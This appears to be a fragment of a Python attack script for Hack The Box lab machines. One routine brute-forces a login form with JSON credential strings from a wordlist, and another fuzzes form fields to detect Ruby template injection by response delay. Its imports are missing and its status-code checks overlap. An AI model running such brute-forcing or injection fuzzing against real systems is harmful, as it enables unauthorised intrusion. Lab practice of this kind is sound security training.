def format_response(response, payload):
    if response.status_code > 300 and response.status_code < 500:
        print(RED + str(response.status_code) + RESET)
    elif response.status_code > 400 and response.status_code < 600:
        print(YELLOW + str(response.status_code) + RESET)
    elif response.status_code > 100 and response.status_code < 300:
        print(GREEN + str(response.status_code) + RESET)
        return
    print(response.text, "with:", payload)

def cypher(url):

#  url = "http://cypher.htb/login"

    session = requests.Session()
    response = session.get(url)

    soup = BeautifulSoup(response.text, "html.parser")

    form = soup.find("form")
    action = form.get("action")
    post_url = urljoin(url, action)
    print("This is the post URL: ", post_url)

    c = [("admin", "admin")]

    with open("wordlist.txt") as f:
        for word in f:
            for u, p in c:
                formatted = f'{{"username":"{word.strip()}","password":"{p}"}}'
                post_response = session.post(post_url, data=formatted, timeout=60)
                format_response(post_response, urllib.parse.quote_plus(formatted))
                time.sleep(1)
                formatted = f'{{"username":"{u}","password":"{word.strip()}"}}'
                post_response = session.post(post_url, data=formatted, timeout=60)
                format_response(post_response, urllib.parse.quote_plus(formatted))
                time.sleep(1)

def weightedgrade(url):

    session = requests.Session()

  #  url = "http://10.10.11.253/weighted-grade"
    response = session.get(url)

    soup = BeautifulSoup(response.text, "html.parser")

    form = soup.find("form")
    action = form.get("action")
    post_url = urljoin(url, action)
    print("This is the post URL: ", post_url)

    payload = {}


    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        value = input_tag.get("value", "")

        if name:
            payload[name] = value
        if not value and input_tag.get("type") == "number" and input_tag.has_attr("required"):
            payload[name] = 20

        if not value and input_tag.get("type") == "text" and input_tag.has_attr("required"):
            payload[name] = "test"

    with open("wordlist.txt") as f:
      for x in f:
        for k, v in payload.items():
          if payload[k] == "test":
              temp = payload[k]
              payload[k] = "FUZZVALUE"
              encoded_payload = urlencode(list(payload.items()))
              encoded_payload = encoded_payload.replace('FUZZVALUE', x.strip())

              start = time.monotonic()
              post_response = session.post(post_url, data=encoded_payload, timeout=60)
              elapsed = time.monotonic() - start

              if elapsed > 5:
                  print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
                  print("Full Payload:", encoded_payload)
                  print("payload: ", x)
                  sys.exit()
              payload[k] = temp
              print(post_response.status_code)
#            print(post_response.text)
          else:
              continue
